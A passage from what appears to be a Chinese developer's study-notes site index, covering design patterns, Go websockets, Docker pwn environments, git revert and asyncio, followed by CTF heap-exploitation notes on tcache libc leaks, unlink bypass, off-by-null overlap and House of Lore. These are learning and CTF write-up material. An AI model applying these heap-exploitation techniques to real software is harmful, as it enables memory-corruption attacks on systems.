也就是不直接依赖B和C而是去依赖一个接口D和E 接口D和E规定了我们需要B和C的哪些函数 这样就可以实现各个类之间的解耦操作 同样的做法也可以解决下面出现的通讯混乱\",\"通讯混乱\",\"也就是在设计模块的时候经常发生各个模块之间怎么实现通讯或者调用其他模块的函数 很容易出现各个模块直接进行随意的函数调用 将大量函数暴露在各个层级之间\"]},\"246\":{\"h\":\"MVC代码设计模式\",\"t\":[\"参考文章:\",\"MVC模式介绍_mvc设计模式-CSDN博客\",\"详解MVC设计模式 - 徐浩进 - 博客园 (cnblogs.com)\",\"mvc架构在设计的时候将视图层和业务层进行了分离 这提供了低耦合性 层级之间不相互依赖 修改比较方便不需要牵一发而动全身 因为不同板块独立性较高所以我们也可以将同一份代码在不同的项目中引用 这提高了较高的重用性 同时mvc由于板块之间分离 调试起来是困难的 以及这样的设计模式对中小型框架是不合适的通常花费大量时间去划分板块换取的效益并不大在中小框架中 其次由于板块之间不互相依赖通常导致一些功能的实现复杂化 框架内部的代码复用性差\",\"这里简单的了解一下MVC设计模式 我们重心在后面 因为其实我们大多数时候写的项目都不会很大 MVC对于中小型项目并不是很友好\",\"由这几个组成:Model View Controller\"]},\"247\":{\"h\":\"Model\",\"t\":[\"封装与应用程序业务逻辑相关的数据以及对数据的处理方法\",\"通常model对数据具备直接访问的权力 比如数据库等\",\"model通常不需要依赖view与Controller\",\"通常view是通过事先在model上注册(观察者模式)(观察者模式后面详细解释)\"]},\"248\":{\"h\":\"View\",\"t\":[\"实现数据有目的的显示 给用户显示出来 然后用户通过view触发一些事件发送给Controller\"]},\"249\":{\"h\":\"Controller\",\"t\":[\"一般用于处理事件并且做出响应 比如用户行为或者Model发生的变化\"]},\"250\":{\"h\":\"观察者模型\",\"t\":[\"「观察者模式」与「发布/订阅模式」，你分得清楚吗？_哔哩哔哩_bilibili\",\"观察者模式一般是解决这样的场景的 比如实现一个广告系统 然后广告的数据A 显示屏B 报纸C 我们A的数据发生变化的时候 B和C当然也得把对于数据刷新显示出来 如果我们在A数据变化的时候去直接调用B和C的显示函数 从而实现数据变化B和C都发生变化 但是这样会导致类之间紧密耦合 也就是A的稳定性依赖于B和C两个类 并且我们每多一个用于显示的类 都需要在A初始化的时候再多传入一个类 并且调用其函数\",\"所以观察者模式就是多设计一个中间人一样的接口 来实现简化这个过程 也就是当A数据更新的时候实际上我们调用的而是D接口 然后B和C都去实现D接口 也就是我们的A接受的是D接口集合 然后在数据更新的时候调用这个集合\"]},\"251\":{\"h\":\"发布订阅模式\",\"t\":[\"也就是抽象出一个消息代理 也就是比如A是发布者 B是订阅者 C是代理 A负责将消息全部塞给C然后C再转发给B B可以选择自己需要什么消息\"]},\"252\":{\"h\":\"失血模型，贫血模型，充血模型和胀血模型\",\"t\":[\"参考文章:DDD（领域驱动设计）系列主题：失血模型，贫血模型，充血模型和胀血模型详细解读和代码案例说明！_贫血模型 充血模型 胀血模型-CSDN博客\",\"OO设计原则 -- OO设计的原则及设计过程的全面总结 - davygeek - 博客园 (cnblogs.com)\",\"这里拿mvc进行举列子\",\"失血模型\",\"也就是mvc中model仅仅包含对象属性的定义并且基础的get/set方法 所有业务逻辑都交给其他层级进行处理\",\"贫血模型\",\"比如说mvc中model仅仅包含对象属性的定义和操作对象的get/set方法 并且包含一些行为 一些基本的函数 但是不依赖Dao层(持久层)的内容 这样层级之间结构清晰 各层之间单向依赖 然后对于业务量小的应用来说 用起来非常自然 开发迅速便于理解 但是同时无法应对非常复杂的逻辑和场景\",\"充血模型\",\"比如mvc中model包含了对象的属性 get/set函数后 还包含了大量相关业务 也依赖于dao层 这样其他的层级负责的东西就比较少 对特定情况进行单独处理 或者其他层级负责权限控制等东西 这是符合OO设计原则的(也就是面对对象设计原则) 同时这样会导致model层业务逻辑模糊 因为我们将分不清楚什么东西该放进model里面什么东西放进其他业务\",\"oo设计原则 也就是基于对象的设计思想 通常特征就是 抽象、封装、继承、多态 通常有这些设计原则:单一职责，开放封闭,依赖倒置,里氏代换,接口隔离\",\"单一职责:任何一个软件模块都应该只对一类行为者负责。 并不是一个模块只做一个事情 而是一个模块对一类行为者负责\",\"开放封闭:也就是基于原本的实现进行扩展而不是进行修改 比如当一个架构已经大体固定下来了 去添加新的功能应该是利用继承重写等机制进行添加新的功能而不是直接对原本的代码进行修改 从而让它适配新的功能 比如我有一个A类其中有个B函数 我们应该是继承A类造出C类 然后C重写B来添加新的逻辑 而不是直接在A的B里面进行添加逻辑 因为这样会导致A中的B过于庞大\",\"依赖倒置:也就是依赖抽象,而不是依赖语句的实现 比如我们函数之间传递的应该大多数时候是接口 而不是一个具体的函数或者具体的结构体/类 面向接口进行编程而不是面对实现\",\"（1）应该避免在代码中写入与任何具体实现相关的名字，或者是其他容易变动的事物名字；\",\"（2）应在代码中多使用抽象接口，尽量避免使用那些多变的具体实现类；\",\"（3）不要在具体实现类上创建衍生类，Golang 语言天生就符合这一点；\",\"（4）不要覆盖包含具体实现的函数，即别重写，在 Skipper v1 的 Task 模式中违反了这一条，因为 Task 模式为了减少代码重复，所有 Task Handler 都需要内嵌 Default Handler，并重写其觉得需要修改的函数。\",\"SDP:稳定依赖原则 也就是依赖必须要指向更稳定的方向 也就是一个稳定的组件不能够依赖一个不稳定的组件 如果是在需要依赖那么请用抽象层将它们隔离开 而不是直接接触\",\"里氏代换:子类型必须能够替换到他们的父类型\",\"接口隔离:多个和客户相关的接口要好于一个通用接口\",\"迪米特法则:也就是如果两个类本身没有直接通讯的手段 尼玛就不要让他们直接产生相互作用 比如A类要调用B类的函数 那么就应该多一个第三方来间接转发这个调用 不应该让多个类之间的依赖混乱化\",\"胀血模型\",\"包含了属性 以及其全部相关的业务逻辑 也包含了不相关的其他逻辑 这样会导致代码的理解和维护性很差 但是大大简化了代码的封层结构\"]},\"253\":{\"h\":\"Go的websocket\",\"t\":[\"参考文章:使用 Go 语言创建 WebSocket 服务 | Go 技术论坛 (learnku.com)\",\"websocket协议实现相对简单,使用的http协议进行初始握手,然后就建立链接.本质websocket还是用的TCP进行读取与写入\"]},\"254\":{\"h\":\"go中建立websocket\",\"t\":[\"在go中建立websocket链接本质是对普通链接的升级。\",\"// handler/ws/echo.go package ws import ( \\\"fmt\\\" \\\"github.com/gorilla/websocket\\\" \\\"net/http\\\" ) var upgrader = websocket.Upgrader{ ReadBufferSize: 1024, WriteBufferSize: 1024, } func EchoMessage(w http.ResponseWriter, r *http.Request) { conn, _ := upgrader.Upgrade(w, r, nil) for { // 读取客户端的消息 msgType, msg, err := conn.ReadMessage() if err != nil { return } // 把消息打印到标准输出 fmt.Printf(\\\"%s sent: %s\\\\n\\\", conn.RemoteAddr(), string(msg)) // 把消息写回客户端，完成回音 if err = conn.WriteMessage(msgType, msg); err != nil { return } } } \",\"这里的EchoMessage就是Handler 实现了Handler接口(也就是参数为:http.ResponesWriter接口和Request指针)\",\"http.ResponesWriter主要负责响应的header和响应数据返回给客户端 一共有三个方法 \",\"Header返回Header对象\",\"Write()向网络链接中写响应数据\",\"WriteHeader()方法将给定的响应状态码和响应Header一起发送出去。\",\"这里upgarder是用于升级http为websocket链接的\",\"type Upgrader struct { // 升级 websocket 握手完成的超时时间 HandshakeTimeout time.Duration // io 操作的缓存大小，如果不指定就会自动分配。 ReadBufferSize, WriteBufferSize int // 写数据操作的缓存池，如果没有设置值，write buffers 将会分配到链接生命周期里。 WriteBufferPool BufferPool //按顺序指定服务支持的协议，如值存在，则服务会从第一个开始匹配客户端的协议。 Subprotocols []string // http 的错误响应函数，如果没有设置 Error 则，会生成 http.Error 的错误响应。 Error func(w http.ResponseWriter, r *http.Request, status int, reason error) // 如果请求Origin标头可以接受，CheckOrigin将返回true。 如果CheckOrigin为nil，则使用安全默认值：如果Origin请求头存在且原始主机不等于请求主机头，则返回false。 // 请求检查函数，用于统一的链接检查，以防止跨站点请求伪造。如果不检查，就设置一个返回值为true的函数 CheckOrigin func(r *http.Request) bool // EnableCompression 指定服务器是否应尝试协商每个邮件压缩（RFC 7692）。 将此值设置为true并不能保证将支持压缩。 目前仅支持“无上下文接管”模式 EnableCompression bool } \",\"checkOrigin可以实现拦截请求 返回true则为放行 false则为不放行\"]},\"255\":{\"h\":\"go检测websocket链接是否存在\",\"t\":[\"[go检测websocket连接是否存在。 - CSDN文库](https://wenku.csdn.net/answer/72997379cf7b47e3ba92e51a413d2529#:~:text=go检测websocket连接是否存在。 时间%3A 2023-07-30 15%3A09%3A42 浏览%3A 112,可以通过检查 websocket.CloseError 来确定连接是否存在。 如果为 nil ，则连接仍然存在。)\",\"if err:= conn.WriteMessage(websocket.PingMessage,[]byte{});err != nil { if websocket.IsCloseError(err,websocket.CloseGoingAway,websocket.CloseAbnormalClosure){ // 链接已经关闭 }else{ // 发生了其他错误 } } \"]},\"256\":{\"h\":\"构建指定版本libc的docker\",\"t\":[\"因为在阅读文章的时候 复现它的操作发现它的libc版本太低了 导致我们的复现失败 所以这里学习docker构造指定版本的libc环境参考文章:Docker配置任意版本编译环境（GCC升级、降级、指定版本）_如何降低docker里面的gcc版本-CSDN博客使用docker调试和部署pwn题-Pwn-看雪-安全社区|安全招聘|kanxue.comdocker run 命令详解（新手入门必备）-CSDN博客\"]},\"257\":{\"h\":\"版本对应\",\"t\":[\"Ubuntu20.04：libc-2.31 Ubuntu18.04：linc-2.27 Ubuntu16.04：libc-2.23 Ubuntu14.04：libc-2.19docke\"]},\"258\":{\"h\":\"操作指令\",\"t\":[\"这里只是浅浅展示一下基础会用到的指令 然后将遇到的报错展示出来 以及对应的解决方法 \",\"install cmd:\",\"docker pull ubuntu:xx.xx \",\"然后因为我下载了docker destop导致报错:\",\"error during connect: this error may indicate that the docker daemon is not running: Get \\\"http://%2F%2F.%2Fpipe%2Fdocker_engine/v1.24/images/json\\\": open //./pipe/docker_engine: The system cannot find the file specified. \",\"找到解决文章:docker 桌面版报错error during connect: This error may indicate that the docker daemon is not running.:-CSDN博客\",\"结果没办法解决 继续报错:\",\"switching to windows engine: request failed and retry attempts exhausted: Post \\\"http://ipc/engine/switch\\\": open \\\\\\\\.\\\\pipe\\\\dockerBackendApiServer: The system cannot find the file specified. \",\"然后开启destop后 自动就好了 怪\",\"查看镜像\",\"docker images \",\"结果:\",\"REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu 22.04 3db8720ecbf5 2 weeks ago 77.9MB ubuntu 18.04 f9a80a55f492 9 months ago 63.2MB ubuntu 16.04 b6f507652425 2 years ago 135MB \",\"运行images\",\"docker run -d -p 宿主机端口:容器端口 --name 容器名称 镜像的标识:镜像名称[:tag] // 我们使用 可以直接进入docker内部 docker run -id --name=\\\"pwn\\\" b6f507652425 /bin/sh // -i 即使未链接stdin(标准输入)也保持打开状态 并且分配一个交互终端 // -t 容器启动后直接进入命令行 // -d 后台运行 // 所以我在这里选择的是 -id \",\"查看正在执行的容器\",\"docker ps -a \",\"结果\",\"CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES af2e5d02e3e8 b6f507652425 \\\"/bin/bash\\\" 3 seconds ago Exited (0) 3 seconds ago pwn_docker 6711535f8c6a 3db8720ecbf5 \\\"/bin/bash\\\" 4 minutes ago Exited (0) 4 minutes ago confident_pike \",\"进入docker\",\"docker exec -it container_id /bin/sh \",\"向docker内部传文件\",\"docker cp 本地地址 container_id:docker内路径 \",\"也可以docker 内部传给本地\",\"docker cp container_di:docker内路径 本地地址 \"]},\"259\":{\"h\":\"主力pwn环境\",\"t\":[\"由于我的vmware中ubuntu再次崩溃了 然后忘记存快照了 所以转使用docker\",\"文章中推荐的主力pwn环境是:\",\"skysider/pwndocker \"]},\"260\":{\"h\":\"pull image\",\"t\":[\"docker pull skysider/pwndocker \"]},\"261\":{\"h\":\"error\",\"t\":[\"进入后使用apt发生报错\",\"Err:1 http://mirrors.aliyun.com/ubuntu bionic InRelease 400 Bad Request [IP: 120.226.194.113 80] Err:2 http://mirrors.aliyun.com/ubuntu bionic-security InRelease 400 Bad Request [IP: 120.226.194.113 80] Err:3 http://mirrors.aliyun.com/ubuntu bionic-updates InRelease 400 Bad Request [IP: 120.226.194.113 80] Err:4 http://mirrors.aliyun.com/ubuntu bionic-proposed InRelease 400 Bad Request [IP: 120.226.194.113 80] Err:5 http://mirrors.aliyun.com/ubuntu bionic-backports InRelease 400 Bad Request [IP: 120.226.194.113 80] \",\"我以为是docker无法链接外部网络的问题 但是ping baidu.com又是可以的 找了很多文章都没有解决 结果加速器一关久解决好了\",\"大概是docker代理的问题 hhh后面找到个类似的解决的文章:Windows docker镜像 apt update时提示400 Bad Request_docker 400 bad request-CSDN博客\",\"--- baidu.com ping statistics --- 15 packets transmitted, 14 received, 6.66667% packet loss, time 17696ms rtt min/avg/max/mdev = 37.782/38.619/41.413/0.892 ms root@936a687b2420:/ctf# ping http://222.187.238.94:9527/ ping: http://222.187.238.94:9527/: Name or service not known root@936a687b2420:/ctf# ping 222.187.238.94:9527 ping: 222.187.238.94:9527: Name or service not known \"]},\"262\":{\"h\":\"各版本的轻量级pwn环境\",\"t\":[\"有大佬已经写好了:roderickchan/debug_pwn_env Tags | Docker Hub我们只需要根据ubuntu的版本 找到我们需要的libc版本进行下载即可\",\"然后就是我没找到ubuntu16.04版本的也就是libc版本为2.23的 因为这个版本之下没有tcache作为一些原理 所以我选择自己拿ubuntu16.04进行搭建轻量级环境\",\"下载python\",\"直接apt install 是3.5版本 连pip都下载不起 所以参考文章:Ubuntu16.04安装Python3.8，3.7，3.9(含卸载方法，支持多版本共存)-CSDN博客\",\"然后根据docker从0搭建ubuntu16.04pwn环境_pwn docker ubuntu16-CSDN博客进行搭建pwn环境即可\"]},\"263\":{\"h\":\"git提交规范 与 项目提交规范学习(浅学习1.0)\",\"t\":[\"因为我使用git比较随性 所以在这里系统学习一下git的代码提交规范 参考文章:[Git代码提交规范-阿里云开发者社区 (aliyun.com)](https://developer.aliyun.com/article/1290068#:~:text=简介： 关于git的规范 良好的代码提交规范可以帮助团队成员更好地理解和维护代码库。 以下是一些常见的Git代码提交规范：,提交频率：尽量保持提交频率较小，每个提交应该只包含一个逻辑上的更改或修复。 提交信息格式：每个提交应该包含一个简明扼要的提交信息，格式为： [类型]%3A 描述。) 结合cubefs社区的提交规范进行的总结\"]},\"264\":{\"h\":\"提交信息格式\",\"t\":[\"commit应该包含一个简明扼要的提交信息\"]},\"265\":{\"h\":\"格式:\",\"t\":[\"[类型]:描述 \",\"列如:feat: 添加用户注册功能\",\"类型 \",\"feat 新增特性/功能\",\"fix修复bug\",\"docs 文档的变更\",\"style 代码风格的调整\",\"refactor 重构代码\",\"test增加或修改测试用例\",\"chore构建过程或者辅助工具的变更\"]},\"266\":{\"h\":\"commit的内容\",\"t\":[\"如果有关联的issue就把issue的编号写出来\",\"fix: 修复登录页面显示问题 #123 \",\"描述清楚修改的内容\",\"顺便可以提供上下文信息\"]},\"267\":{\"h\":\"分支管理\"},\"268\":{\"h\":\"主分支:\",\"t\":[\"一般是master/main用于部署稳定的版本\",\"develop分支一半用于功能开发或者集成测试\",\"bugfix一般用于解决问题 和 修复bug\",\"feature分支用于创建新功能时的测试分支\"]},\"269\":{\"h\":\"Code Review\",\"t\":[\"我这里的理解是如提交pr的时候先挂着 然后等待一堆人讨论后再合并\",\"良好的审查机制\",\"共同讨论\"]},\"270\":{\"h\":\"提交pr的规范\",\"t\":[\"一般是填写一个表格\",\"// 说明你的pr的作用 / 我们为什么需要它 What this PR does / why we need it: // 此pr修复了什么 Which issue this PR fixes: // 修复问题的编号 fixes # // 给你的批阅者的特别注意事项 Special notes for your reviewer: // 发布说明 Release note: \"]},\"271\":{\"h\":\"记一次删除commit操作\"},\"272\":{\"h\":\"目的\",\"t\":[\"项目上传一个commit 但是这个commit带了bug 为了安全的 优雅的去除这个bug 而且我觉得自己手动查看上次的commit内容并且删除对应文件有点麻烦 不能以后每次都这样操作 于是学习一下如何用git安全地去除(本来不足以写成一篇博文的 但是我感觉以后我可能忘记 于是还是写上)\",\"学习文章:如何从 Github 中删除提交 - 知乎 (zhihu.com)\",\"【git revert】使用以及理解（详解）_git revert用法-CSDN博客\"]},\"273\":{\"h\":\"使用git revert原因\",\"t\":[\"因为从git中删除一个commit这通常是一个坏主意(文章说的)\",\"\\\"从 Git 的历史记录中删除提交通常是一个坏主意。Git 旨在跟踪文件的每个版本\\\"\",\"以及git revert和git reset的区别\",\"revert是用一个新的commit（逆向commit）中合要去除的commit\",\"也就是说我们的commit链长这个样子\",\"![img](file:///C:\\\\Users\\\\NewOm\\\\Documents\\\\Tencent Files\\\\614286773\\\\nt_qq\\\\nt_data\\\\Pic\\\\2024-03\\\\Ori\\\\403fa820f3bc49c2fdf37a4f0419fac2.png)\",\"reset通常是直接删除\"]},\"274\":{\"h\":\"git revert的类型\",\"t\":[\"一种是直接revert common commit 也就是正常git commit产生的commit 我们直接输入指令\",\"git revert commit_id \",\"还有一种是revert merge commit 也就是通过merge合并分支产生的commit\",\"git revert -m num commit_id \",\"这里的num 也就是我们要选择的主线\",\"num我们可以通过git show commit_id来查看\",\"git show bd86846 commit bd868465569400a6b9408050643e5949e8f2b8f5 Merge: ba25a9d 1c7036f \",\"这里num为1就是让ba25a9d 为主线 2则是1c7036f\"]},\"275\":{\"h\":\"使用git revert的注意事项\",\"t\":[\"这里最好直接去看原文 因为这次我的问题其实不属于这种情况但是还是写下来 方便以后查看\",\"简单总结就是如果我fork了一个分支 然后进行了修改 并且merge进入了master分支\",\"但是写太多bug了被revert了 我继续基于我的分支进行了fix bug 然后我想重新合并回去\",\"就不能直接git merge 而是先revert 掉revert我merge commit分支的那个commit（这里称为g commit）（这里很绕建议直接看原文章的图 写得很好）\",\"而是我们先revert掉g commit然后再merge进入master分支 不然会出问题（仅新的commit会被合并）\"]},\"276\":{\"h\":\"实践\",\"t\":[\"由于我们是common commit 也就是正常的commit 所以我们直接进行git revert HEAD即可（因为是最新的commit）\",\"image-20240317160934372\"]},\"277\":{\"h\":\"python asyncio学习\",\"t\":[\"文章:技术揭秘 | 理解 asyncio 来构建高性能 Python 网络程序 - 知乎 (zhihu.com)\",\"python中的asyncio使用详解_python asyncio-CSDN博客\"]},\"278\":{\"h\":\"基础对象\",\"t\":[\"Eventloop\",\"Future\",\"Promise\",\"Generator\"]},\"279\":{\"h\":\"eventloop\",\"t\":[\"注册事件 并对每个事件添加callback回调函数 会去循环以及准备好的堵塞事件 触发其回调函数\",\"class EventLoop: def __init__(self): self.events_to_listen = [] self.callbacks = {} def register(self,event,callback): self.events_to_listen.append(event) self.callbacks[event] = callback def unregister(self,event): self.events_to_listen.remove(event) del self.callbacks[event] def _process_events(self,events): for event in events: self.callbacks[events](event) def start_loop(self): while True: events_happend = poll_events(self.events_to_listen,timeout) self._process_events(events_happend) \",\"就相当于我们向里面注册会堵塞的事件 然后当这个事件完成的时候再自动触发其回调函数 这样就不会堵塞了\"]},\"280\":{\"h\":\"Future\",\"t\":[\"和名字表达的意思一样 也就是当一个函数是异步状态的时候 返回值通常不会马上获取到 为了代码的可读性以及逻辑的连贯性 我们选择返回一个future对象\",\"相当于为未来可能的值占位的作用 经历了promise过程后future将会塞入返回值 下面是其接口 简单来说就是设置删除检查三步走\",\"future值相关\",\"result()获取future的值\",\"set_result()设置future的值\",\"cancel()取消一个future\",\"cancancel()查看future是否已经被取消了\",\"add_done_callback(callback,*,context=None)设置一个future完成时候要触发的回调函数\",\"done()查看future是否有值\",\"异常相关\",\"exception()获取一个异常\",\"set_exception()设置异常\"]},\"281\":{\"h\":\"Generator生成器\",\"t\":[\"这种就类似于lua中的协程了 主要通过yield关键字来实现切换控制权\",\"当我们在函数使用了yield关键字后 函数调用的时候就变成了生成器 会返回一个生成器对象 此时函数并未真正在执行\",\"num = 0 def gen(): global num print(\\\"函数执行\\\") for i in range(3): num+= yield i g = gen() print(g) \",\"image-20240406165914445\",\"生成器对象.send(arg)后args会变成yield的返回值 出现在函数内部 并且当我调用send的时候 函数才会真正执行 send的返回值是yield右侧的值\",\"num = 0 def gen(): global num print(\\\"函数被调用\\\") for i in range(3): num+= yield i print(\\\"num的值为:\\\",num) g = gen() print(g.send(None)) print(g.send(3)) \",\"image-20240406170144040\"]},\"282\":{\"h\":\"基本使用\",\"t\":[\"asyncio.gather() 并发 启动\",\"await asyncio.gather(testa(1),testb(2)) \",\"这里testa和testb就同步运行了 只需要把函数调用(async声明的)作为参数传入asyncio.gather中即可\",\"task启动\"]},\"283\":{\"h\":\"c2018-HitCon-gundam(tcahe机制+泄露libc地址)\"},\"284\":{\"h\":\"重要知识点\",\"t\":[\"由于linux中使用free()进行内存释放时，不大于 max_fast （默认值为 64B）的 chunk 被释放后，首先会被放到 fast bins中，大于max_fast的chunk或者fast bins 中的空闲 chunk 合并后会被放入unsorted bin中。而在fastbin为空时，unsortbin的fd和bk指向自身main_arena中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出main_arena的实际地址，结合偏移值从而得到libc的加载地址。\"]},\"285\":{\"h\":\"tcahe机制\",\"t\":[\"学习文章:glibc Tcache机制-CSDN博客\",\"一共有64个bins\",\"Tcache缓存的是非Large Chunk的chunk。\",\"首先是tcahe是单链表结构,每条链上最多可以有7个chunk\",\"free后 当对应的tcahe bin放满了 才会放入fastbin,unsorted bin\",\"malloc的时候优先去tcahe中找\"]},\"286\":{\"h\":\"机制\",\"t\":[\"代码:\",\"这里tcache_perthread_struct 首先\",\"counts代表着每个bin当前所有的chunk数量\",\"tcache_entry代表着当前bin的首个chunk\",\"由于是单链形式 所以结构体属性就是下一个chunk的指针\",\"typedef struct tcache_entry { struct tcache_entry *next; } tcache_entry; /* There is one of these for each thread, which contains the per-thread cache (hence \\\"tcache_perthread_struct\\\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */ typedef struct tcache_perthread_struct { char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct; static __thread tcache_perthread_struct *tcache = NULL; \",\"结构图\",\"机制\"]},\"287\":{\"h\":\"利用tcache泄露地址\",\"t\":[\"tcache位于heap最前端 也属于一个堆块\",\"用vmmap指令查找heap最开始的位置\",\"用x/26gx 指令来查看对应地址 堆结构 （x/26gx 0x55e22cd98000+0x10）\",\"heap\",\"也就是最后一个加入tcache的chunk\",\"我们通过连续申请8个gundam,让第八个gundam出现在unsorted bin里面 那么我们如何找到它呢?\",\"我们这里知道了第七个地址 那么第八个的地址:x/26gx 0x000055e22cd98a10+0x30+0x110-0x10\",\"一个gundam包含两个chunk,大小为0x30,另一个为0x110\",\"那么输入指令后我们找到了这个chunk\",\"unsorted_bins\",\"我们可以发现这个地方fd和bk都指向了 同一个地址 也就是main_arena+88(unsortedbin头结点)\",\"然后我们就得到了main_arena的地址\",\"再去查找libc的基地址 vmmap得到的:\",\"计算:\",\"0x7f566befac78-libc基地址0x7f566bb4f000=偏移0x3ac78\",\"这里我们就得到了偏移 这样在远程服务器的时候就可以利用这个偏移获取libc基地址\"]},\"288\":{\"h\":\"写一个计算chunk大小的程序\",\"t\":[\"由于做题的时候老是脑子不够用 无法根据malloc(num)中的num获取chunk的size 所以我就决定自己写一个程序来完成这个工作并且好好理解一下怎么计算的\"]},\"289\":{\"h\":\"原理\",\"t\":[\"最小chunk为0x20\",\"chunk一定是size_sz *2 的倍数(内存对齐)\",\"chunk可以占用下一个chunk的prev_size来存东西\",\"所以我们就是看是否malloc的大小 +size所占字节数 然后是否内存对齐 如果没有则加到对齐 然后 判断最后的size是否小于0x20 如果小于则直接等于0x20\",\"所以直接使用公式:(num + 8 +0xf)&~0xf; 其中num就是我们malloc传的参数\"]},\"290\":{\"h\":\"脚本\",\"t\":[\"#include <stdio.h> #include<stdlib.h> int main() { while (1) { int num = 0; int size = 0; int num2 = 0; printf(\\\"malloc:\\\"); scanf(\\\"%x\\\",&num); size = (num + 8 +0xf)&~0xf; if (size < 0x20) { size = 0x20; } if (size -16 < num) { printf(\\\"will take up prev_size of the next chunk\\\\n\\\"); } printf(\\\"0x%x\\\",size); fflush(stdin); printf(\\\"\\\\n\\\"); /* code */ } return 0; } \"]},\"291\":{\"h\":\"ezChunk(unlink+offbynull)\"},\"292\":{\"h\":\"分析一下题\",\"t\":[\"进入 addemo函数内部 查找关键结构体\",\"st数据看起来是关键\",\"(_DWORD *)&st_next12 + 10 * i 这个是存size的\",\"(_QWORD *)&st + 5 * i这个是emo content的内容\",\"(char *)&st + 40 * i + 20是存name的\",\"*((_DWORD *)&st_next8 + 10 * i)存使用情况\",\"我们这里开始简单运算一下 这个数组到底是怎么存放数据的 指针为char类型\",\"存size: point + 40 *i +12 存 int类型\",\"存content :point + 40 *i 存一个结构体指针\",\"存name: point + 40*i +20\",\"存使用情况:point +40*i +8 存一个int\",\"所以每个元素:\",\"type emo struct { Content *string // 0-8 IsUsed int // 8-12 Size int // 12-16 index int // 16-20 Name string[16] //20-36 } \"]},\"293\":{\"h\":\"chunk分析\",\"t\":[\"在addemo的时候name malloc(0x10) 马上free了 但是没有清空\",\"emo content的时候malloc(size)\",\"在delemo的时候是根据emo.isused来判断是否存在的\",\"emo.content被清空 并且被清空\",\"emo.isused被设置为0\",\"editemo的时候是根据判断emo.content是否为空去编辑的\",\"直接向emo.content中写入内容\",\"printemo是根据emo.content是否为空去判断的\",\"然后直接打印出来\"]},\"294\":{\"h\":\"漏洞学习\",\"t\":[\"这题存在off_by_null漏洞\",\"构造heap overlap 触发unlink漏洞\"]},\"295\":{\"h\":\"先学习unlink漏洞\",\"t\":[\"学习文章:一道题彻底理解 Pwn Heap Unlink-腾讯云开发者社区-腾讯云 (tencent.com)\",\"明确一下对象双向链表\",\"宏定义\",\"#define unlink(AV, P, BK, FD) \",\"P： 待脱链的空闲chunk的指针\",\"BK：后一个chunk的指针\",\"FD：前一个chunk的指针\"]},\"296\":{\"h\":\"流程\",\"t\":[\"大小检查\",\"if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (\\\"corrupted size vs. prev_size\\\"); \",\"检查下一个chunk的prev_size是否与p的大小相同\",\"获取fd与bk\",\"通过p的fd/bk去获取前面一个chunk的fd和后面一个chunk的bk\",\"检查\",\"if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr (\\\"corrupted double-linked list\\\"); \",\"这里很关键因为会检查前后chunk中 fd或者bk 指向的是否是p chunk\",\"这里等效为:\",\"P->fd->bk == P <=> *(P->fd + 0x18) == P p->bk->fd == P <=> *(p->bk + 0x10) == P \",\"那么就很明确了\",\"将p->fd置为 (&p-0x18)\",\"将p->bk设置为 (&p-0x10)\",\"脱链\",\"FD->bk = BK 与BK->fd = FD\",\"FD->bk = BK <=> P->fd->bk = p->bk <=> *(P->fd + 0x18) = P->bk //Ⅰ BK->fd = FD <=> P->bk->fd = p->fd <=> *(P->bk + 0x10) = P->fd //Ⅱ \",\"等效为: P->fd->bk = p->bk与 P->bk->fd = p->fd\",\"这里相当于让前后的chunk连接起来了 把中间的chunk忽略掉\"]},\"297\":{\"h\":\"调试技巧\",\"t\":[\"heap可以查看当前的chunk\"]},\"298\":{\"h\":\"学习路线:\",\"t\":[\"学习路线\",\"​\"]},\"299\":{\"h\":\"记一次高版本glibc(2.34)下常规overlapping失败的原因（vctf 2024 apples）\",\"t\":[\"昨天做vctf被打自闭了 由于对glibc高版本的保护不熟悉 第二题apples 连leak libc都没实现\",\"这里记录一下为什么常规overlapping会失效\"]},\"300\":{\"h\":\"版本\",\"t\":[\"glibc 2.34\",\"off_by_one漏洞\"]},\"301\":{\"h\":\"读题\",\"t\":[\"首先是add user部分 存在off_by_one漏洞\",\"image-20240317100413787\",\"delete部分无懈可击()\",\"img\"]},\"302\":{\"h\":\"错误思路\",\"t\":[\"由于前段时间做了hgame的week3的一道overlapping 所以我就自然想到了这题先利用overlapping leak出来我们的libc地址\",\"大概思路就是:\",\"先malloc 11个（第十一个防止合并）chunk 然后free 7个chunk 占满tacache\",\"然后free 第9chunk malloc回来 写入刚好size大小的数据（并且构造好prev_size） 让0溢出到 第10个chunk上\",\"最后我们free 第10个chunk 就可以利用合并机制 将fd和bk包含在这个大chunk中 再利用分割机制就可以泄露libc\",\"简化后的流程图就是:\",\"img\"]},\"303\":{\"h\":\"失败原因\",\"t\":[\"主要是glibc在高版本下的安全检查机制\",\"合并时对prev_chunk的size检查\",\"我们可以明显发现 这里多了一条if检查语句 用于检查计算prev_size得出的chunk的size大小是否等于我们的prev_size大小 这样就阻止了我们跨chunk进行合并\",\"glic-2.27下\",\"image-20240317101747206\",\"glibc-2.34下\",\"image-20240317101823846\"]},\"304\":{\"h\":\"House of lore学习\",\"t\":[\"主要是看着wiki 理解理解 然后自己看的glibc2.27的源码 抛开tcache部分\"]},\"305\":{\"h\":\"源码\",\"t\":[\"这里是去除了不重要的tcache bin判断部分\",\"if (in_smallbin_range (nb)){ idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) { bck = victim->bk; if (__glibc_unlikely (bck->fd != victim)) malloc_printerr (\\\"malloc(): smallbin double linked list corrupted\\\"); set_inuse_bit_at_offset (victim, nb); bin->bk = bck; bck->fd = bin; if (av != &main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } \"]},\"306\":{\"h\":\"漏洞利用图\",\"t\":[\"image-20240319205119155\",\"这里我们可以直观看见bck victim bin的相对位置 这里我简化了部分链\",\"由于定位bck是通过victim来确定的\",\"bck = victim->bk; \",\"所以一但我们劫持了victim的bk后 指向我们我们stack里面的空间 或者任何一个我们我们想控制的空间\",\"这样修改victim 中bk值 